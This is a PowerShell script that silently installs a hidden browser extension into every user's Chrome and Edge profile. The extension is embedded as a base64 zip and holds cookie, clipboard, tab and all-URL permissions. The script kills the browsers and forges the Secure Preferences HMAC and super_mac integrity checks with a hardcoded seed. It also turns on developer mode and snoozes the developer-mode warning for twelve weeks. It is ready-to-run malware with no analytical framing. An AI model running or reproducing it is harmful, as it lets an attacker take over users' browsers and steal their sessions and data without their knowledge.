$extension_zip = "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"




function removeEmpty {
    param($d)

    if ($d -is [System.Collections.Specialized.OrderedDictionary]) {
        $t = New-Object 'System.Collections.Specialized.OrderedDictionary'
        foreach ($key in $d.Keys) {
            $t[$key] = $d[$key]
        }

        foreach ($x in $t.Keys) {
            $y = $t[$x]

            if ($y -is [System.Collections.Specialized.OrderedDictionary]) {
                if ($y.Count -eq 0) {
                    $d.Remove($x)
                } else {
                    removeEmpty $y
                    if ($y.Count -eq 0) {
                        $d.Remove($x)
                    }
                }
            } elseif ($y -is [hashtable]) {
                if ($y.Count -eq 0) {
                    $d.Remove($x)
                } else {
                    removeEmpty $y
                    if ($y.Count -eq 0) {
                        $d.Remove($x)
                    }
                }
            } elseif ($y -is [System.Collections.IList]) {
                if ($y.Count -eq 0) {
                    $d.Remove($x)
                } else {
                    removeEmpty $y
                    if ($y.Count -eq 0) {
                        $d.Remove($x)
                    }
                }
            } else {
                if (-not $y -and $y -ne $false -and $y -ne 0) {
                    $d.Remove($x)
                }
            }
        }
    } elseif ($d -is [System.Collections.IList]) {
        for ($i = $d.Count - 1; $i -ge 0; $i--) {
            $x = $i
            $y = $d[$i]

            if ($y -is [System.Collections.Specialized.OrderedDictionary]) {
                if ($y.Count -eq 0) {
                    $d.RemoveAt($x)
                } else {
                    removeEmpty $y
                    if ($y.Count -eq 0) {
                        $d.RemoveAt($x)
                    }
                }
            } elseif ($y -is [hashtable]) {
                if ($y.Count -eq 0) {
                    $d.RemoveAt($x)
                } else {
                    removeEmpty $y
                    if ($y.Count -eq 0) {
                        $d.RemoveAt($x)
                    }
                }
            } elseif ($y -is [System.Collections.IList]) {
                if ($y.Count -eq 0) {
                    $d.RemoveAt($x)
                } else {
                    removeEmpty $y
                    if ($y.Count -eq 0) {
                        $d.RemoveAt($x)
                    }
                }
            } else {
                if (-not $y -and $y -ne $false -and $y -ne 0) {
                    $d.RemoveAt($x)
                }
            }
        }
    }
}

function calculateHMAC {
    param(
        [Parameter(Mandatory)]
        [object]$value_as_string,
        [Parameter(Mandatory)]
        [string]$path,
        [Parameter(Mandatory)]
        [string]$sid,
        [Parameter(Mandatory)]
        [byte[]]$seed
    )

    if ($value_as_string -is [System.Collections.IDictionary] -or $value_as_string.PSObject.TypeNames -contains 'System.Management.Automation.PSCustomObject') {
        removeEmpty -d $value_as_string
    }

    $jsonValue = $value_as_string | ConvertTo-Json -Depth 100
    $jsonValueMinified = $jsonValue -replace '\s', ''
    $jsonValueMinified = $jsonValueMinified -replace '<', '\u003C'
    $jsonValueMinified = $jsonValueMinified -replace 'u003c', 'u003C'
    $jsonValueMinified = $jsonValueMinified -replace '\\u003e', '>'

    $message = $sid + $path + $jsonValueMinified
    $hmacsha256 = New-Object System.Security.Cryptography.HMACSHA256
    $hmacsha256.Key = $seed
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($message)
    $hashBytes = $hmacsha256.ComputeHash($bytes)

    $hash = ($hashBytes | ForEach-Object { $_.ToString("x2") }) -join ''
    return $hash.ToUpper()
}

function calc_supermac {
    param(
        [string]$json_file,
        [string]$sid,
        [byte[]]$seed
    )

    $json_text = Get-Content -Path $json_file -Raw -Encoding UTF8
    $data = ConvertFrom-Json -InputObject $json_text
    $macs = $data.protection.macs

    $macsJson = $macs | ConvertTo-Json -Depth 100
    $macsJsonMinified = $macsJson -replace '\s', ''

    $super_msg = "$sid$macsJsonMinified"
   
    $hmacsha256 = New-Object System.Security.Cryptography.HMACSHA256
    $hmacsha256.Key = $seed
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($super_msg)
    $hashBytes = $hmacsha256.ComputeHash($bytes)

    $hash = ($hashBytes | ForEach-Object { $_.ToString("x2") }) -join ''
    return $hash.ToUpper()
}

function find_extensions_settings {
    param (
        [string]$user,
        [ValidateSet("edge", "chrome")]
        [string]$browser
    )

    if ($browser -eq 'chrome') {
        $files_to_check = @(
            "C:\users\$user\appdata\local\Google\Chrome\User Data\Default\Secure Preferences",
            "C:\users\$user\appdata\local\Google\Chrome\User Data\Default\Preferences"
        )
    } elseif ($browser -eq 'edge') {
        $files_to_check = @(
            "C:\users\$user\appdata\local\Microsoft\Edge\User Data\Default\Secure Preferences",
            "C:\users\$user\appdata\local\Microsoft\Edge\User Data\Default\Preferences"
        )
    } else {
        return $null
    }


    foreach ($file_path in $files_to_check) {
        if (Test-Path $file_path) {
            try {
                $json_text = Get-Content -Path $file_path -Raw -Encoding UTF8
                $data = $json_text | ConvertFrom-Json

                if ($data.PSObject.Properties.Name -contains 'extensions') {
                    if ($data.extensions.PSObject.Properties.Name -contains 'settings') {
                        return $file_path
                    }
                }
            } catch {
                continue
            }
        }
    }

    return $null
}

function add_extension {
    param(
        [string]$user,
        [string]$sid,
	[string]$browser
    )

    $edgeseed = ''
    $chromeseed=[System.Convert]::FromBase64String('50jzNthepfnc3yXY80emW0zfZnYA8C32ckoq8YohLSa3iKJQhpEM86kDE2locfPcBYI3MMkd+LpcT9nIhLUFqA==')
    
    $fileTime = [long]((([DateTime]::UtcNow).AddMinutes(-15) - [DateTime]::Parse('1601-01-01T00:00:00Z')).TotalMilliseconds * 1000)

    $extension_json = '{"account_extension_type":0,"active_permissions":{"api":["activeTab","bookmarks","clipboardRead","clipboardWrite","cookies","storage","tabs","declarativeNetRequest","scripting","declarativeNetRequestWithHostAccess"],"explicit_host":["http://*/*","https://*/*"],"scriptable_host":["\u003Call_urls>"]},"creation_flags":38,"dnr_dynamic_ruleset":{"checksum":929336130},"first_install_time":"' + $filetime + '","from_webstore":false,"granted_permissions":{"api":["activeTab","alarms","bookmarks","clipboardRead","clipboardWrite","cookies","storage","tabs","unlimitedStorage","declarativeNetRequest","scripting","declarativeNetRequestWithHostAccess"],"explicit_host":["http://*/*","https://*/*"],"scriptable_host":["\u003Call_urls>"]},"last_update_time":"' + $filetime + '","location":4,"newAllowFileAccess":true,"path":"pgkcjpgeckgohokcngngdnoacpkaenkk","service_worker_registration_info":{"version":"1.0"},"serviceworkerevents":["runtime.onInstalled","runtime.onStartup","tabs.onUpdated"],"was_installed_by_default":false,"was_installed_by_oem":false,"withholding_permissions":false}'

    Add-Type -AssemblyName System.Web.Extensions
    $serializer = New-Object System.Web.Script.Serialization.JavaScriptSerializer
    $serializer.MaxJsonLength = 67108864
    $dict_extension = $serializer.DeserializeObject($extension_json)

    $filepath = find_extensions_settings $user -browser $browser

    if (-not $filepath) {
        return
    }

    try {
        $json_text = Get-Content -Path $filepath -Raw -Encoding UTF8
        $data = $serializer.DeserializeObject($json_text)

        if (-not $data.ContainsKey('extensions')) { $data['extensions'] = @{} }
        if (-not $data['extensions'].ContainsKey('settings')) { $data['extensions']['settings'] = @{} }

        $data['extensions']['settings']['pgkcjpgeckgohokcngngdnoacpkaenkk'] = $dict_extension

        if (-not $data['extensions'].ContainsKey('ui')) { $data['extensions']['ui'] = @{} }
        $data['extensions']['ui']['developer_mode'] = $false

        $path = "extensions.settings.pgkcjpgeckgohokcngngdnoacpkaenkk"

	if ($browser -eq "chrome") {
      	    $macs = calculateHMAC $dict_extension $path $sid $chromeseed
	}
	else {
	    $macs = calculateHMAC $dict_extension $path $sid $edgeseed
	}

        if (-not $data.ContainsKey('protection')) { $data['protection'] = @{} }
        if (-not $data['protection'].ContainsKey('macs')) { $data['protection']['macs'] = @{} }
        if (-not $data['protection']['macs'].ContainsKey('extensions')) { $data['protection']['macs']['extensions'] = @{} }
        if (-not $data['protection']['macs']['extensions'].ContainsKey('settings')) { $data['protection']['macs']['extensions']['settings'] = @{} }

        $data['protection']['macs']['extensions']['settings']['pgkcjpgeckgohokcngngdnoacpkaenkk'] = $macs

	if ($browser -eq "chrome") {
            $supermac = calc_supermac $filepath $sid $chromeseed
	}
	else {
	    $supermac = calc_supermac $filepath $sid $edgeseed
	}
        $data['protection']['super_mac'] = $supermac

        $json_out = $serializer.Serialize($data)
        Set-Content -Path $filepath -Value $json_out -Encoding UTF8

    } catch {
        return $null
    }
}

function enable_dev {
    param(
        [string]$user,
        [string]$sid,
	[string]$browser
    )

    $edgeseed = ''
    $chromeseed=[System.Convert]::FromBase64String('50jzNthepfnc3yXY80emW0zfZnYA8C32ckoq8YohLSa3iKJQhpEM86kDE2locfPcBYI3MMkd+LpcT9nIhLUFqA==')

    # Load JSON serializer
    Add-Type -AssemblyName System.Web.Extensions
    $serializer = New-Object System.Web.Script.Serialization.JavaScriptSerializer
    $serializer.MaxJsonLength = 67108864

    $filepath = find_extensions_settings $user -browser $browser

    if (-not $filepath) {
        return
    }

    try {
        $json_text = Get-Content -Path $filepath -Raw -Encoding UTF8
        $data = $serializer.DeserializeObject($json_text)


        if (-not $data.ContainsKey('extensions')) { $data['extensions'] = @{} }
        if (-not $data['extensions'].ContainsKey('ui')) { $data['extensions']['ui'] = @{} }

        $data['extensions']['ui']['developer_mode'] = $true

        $devpath = "extensions.ui.developer_mode"

	if ($browser -eq "chrome") {
      	    $devkey = calculateHMAC $true $devpath $sid $chromeseed
	}
	else {
	    $devkey = calculateHMAC $true $devpath $sid $edgeseed
	}

        # Ensure protection path exists
        if (-not $data.ContainsKey('protection')) { $data['protection'] = @{} }
        if (-not $data['protection'].ContainsKey('macs')) { $data['protection']['macs'] = @{} }
        if (-not $data['protection']['macs'].ContainsKey('extensions')) { $data['protection']['macs']['extensions'] = @{} }
        if (-not $data['protection']['macs']['extensions'].ContainsKey('ui')) { $data['protection']['macs']['extensions']['ui'] = @{} }

        # Set the HMAC
        $data['protection']['macs']['extensions']['ui']['developer_mode'] = $devkey

	if ($browser -eq "chrome") {
            $supermac = calc_supermac $filepath $sid $chromeseed
	}
	else {
	    $supermac = calc_supermac $filepath $sid $edgeseed
	}
        $data['protection']['super_mac'] = $supermac

        $json_out = $serializer.Serialize($data)
        Set-Content -Path $filepath -Value $json_out -Encoding UTF8

    } catch {
       return $null
    }
}


function Get-SidWithoutRid {
    param([string]$username)

    $ntAccount = New-Object System.Security.Principal.NTAccount($username)
    try {
        $sidObj = $ntAccount.Translate([System.Security.Principal.SecurityIdentifier])
        $sidStr = $sidObj.Value
        $sidParts = $sidStr -split '-'
        $sidWithoutRid = ($sidParts[0..($sidParts.Length - 2)] -join '-')
        return $sidWithoutRid
    }
    catch {
        return $null
    }
}

function delay_dev_mode_warning {

    $filepath = "C:\users\$user\appdata\local\Microsoft\Edge\User Data\Default\Preferences"

    if (-not (Test-Path -Path $filepath)) {
        Write-Host "No valid file found for user $user"
        return
    }

    Add-Type -AssemblyName System.Web.Extensions
    $serializer = New-Object System.Web.Script.Serialization.JavaScriptSerializer

    $json_text = Get-Content -Path $filepath -Raw -Encoding UTF8
    $data = $serializer.DeserializeObject($json_text)


    if (-not $data.ContainsKey('extensions')) { $data['extensions'] = @{} }
    if (-not $data['extensions'].ContainsKey('settings')) { $data['extensions']['settings'] = @{} }
    if (-not $data['extensions'].ContainsKey('ui')) { $data['extensions']['ui'] = @{} }

    $futureDate = (Get-Date).ToUniversalTime().AddDays(7 * 12)
    $unixEpoch = [DateTime]"1970-01-01T00:00:00Z"
    $chromeEpoch = [DateTime]"1601-01-01T00:00:00Z"
    $epochDiff = ($unixEpoch - $chromeEpoch).TotalSeconds

    $fileTime = ([int64]($futureDate - $chromeEpoch).TotalSeconds * 1000000).ToString()

    $data['extensions']['ui']['dev_mode_warning_snooze_end_time'] = $fileTime

    $json_out = $serializer.Serialize($data) -replace '\s+', ''

    Set-Content -Path $filepath -Value $json_out -Encoding UTF8
}

function kill_browsers {
    $browsers = @(
        @{ Name = "chrome"; ProcessName = "chrome" },
        @{ Name = "edge"; ProcessName = "msedge" }
    )

    $killedBrowsers = @{}

    foreach ($browser in $browsers) {
        $processes = Get-Process -Name $browser.ProcessName -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowHandle -ne 0 }

        if ($processes) {
            foreach ($proc in $processes) {
                try {
                    $proc.Kill()
                }
                catch {
                    return $null
                }
            }
            $killedBrowsers[$browser.Name] = $true
        }
    }
    return $killedBrowsers
}

function start_browsers {
    param (
        [hashtable]$browsersToStart
    )

    $browserPaths = @{
        "chrome" = "C:\Program Files\Google\Chrome\Application\chrome.exe"
        "edge"   = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
    }
    foreach ($browser in $browsersToStart.Keys) {
        if ($browsersToStart[$browser] -eq $true) {
            $exePath = $browserPaths[$browser]
            if (Test-Path $exePath) {
                Start-Process -FilePath $exePath
            } else {
                return $null
            }
        }
    }
}

function Install-ExtensionFromBase64 {
    param (
        [string]$base64Zip,
	[string] $user
    )

    $folderName = "pgkcjpgeckgohokcngngdnoacpkaenkk"

    $edgePath = "C:\Users\$user\AppData\Local\Microsoft\Edge\User Data\Default\Extensions\$folderName"
    $chromePath = "C:\Users\$user\AppData\Local\Google\Chrome\User Data\Default\Extensions\$folderName"

    $tempZipPath = [System.IO.Path]::Combine($env:TEMP, "$folderName.zip")
    $tempExtractPath = [System.IO.Path]::Combine($env:TEMP, "$folderName-unzipped")

    try {
        [IO.File]::WriteAllBytes($tempZipPath, [Convert]::FromBase64String($base64Zip))

        if (Test-Path $tempExtractPath) { Remove-Item -Path $tempExtractPath -Recurse -Force }
        Expand-Archive -Path $tempZipPath -DestinationPath $tempExtractPath -Force

        # Create destination folders if they don't exist
        foreach ($dest in @($edgePath, $chromePath)) {
            if (!(Test-Path $dest)) {
                New-Item -Path $dest -ItemType Directory -Force | Out-Null
            }
            Copy-Item -Path "$tempExtractPath\*" -Destination $dest -Recurse -Force
        }
    }
    catch {
        return $null
    }
    finally {
        # Clean up temp files
        if (Test-Path $tempZipPath) { Remove-Item $tempZipPath -Force }
        if (Test-Path $tempExtractPath) { Remove-Item $tempExtractPath -Recurse -Force }
    }
}

$users = if (([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrators') -or [System.Security.Principal.WindowsIdentity]::GetCurrent().Name -eq 'NT AUTHORITY\SYSTEM') { 
    Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\*' | 
    Select-Object -ExpandProperty ProfileImagePath -ErrorAction SilentlyContinue | 
    Where-Object { $_ -like "$env:SystemDrive\Users\*" } | 
    Split-Path -Leaf 
} else { 
    [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[-1] 
}

$killed = kill_browsers
foreach ($user in $users) {
	$sid = Get-SidWithoutRid $user

	add_extension $user $sid 'edge'
	add_extension $user $sid 'chrome'
	Install-ExtensionFromBase64 $extension_zip $user
	Start-Sleep -Seconds 2

	enable_dev $user $sid 'edge'
	enable_dev $user $sid 'chrome'
	delay_dev_mode_warning
}

start_browsers -browsersToStart $killed
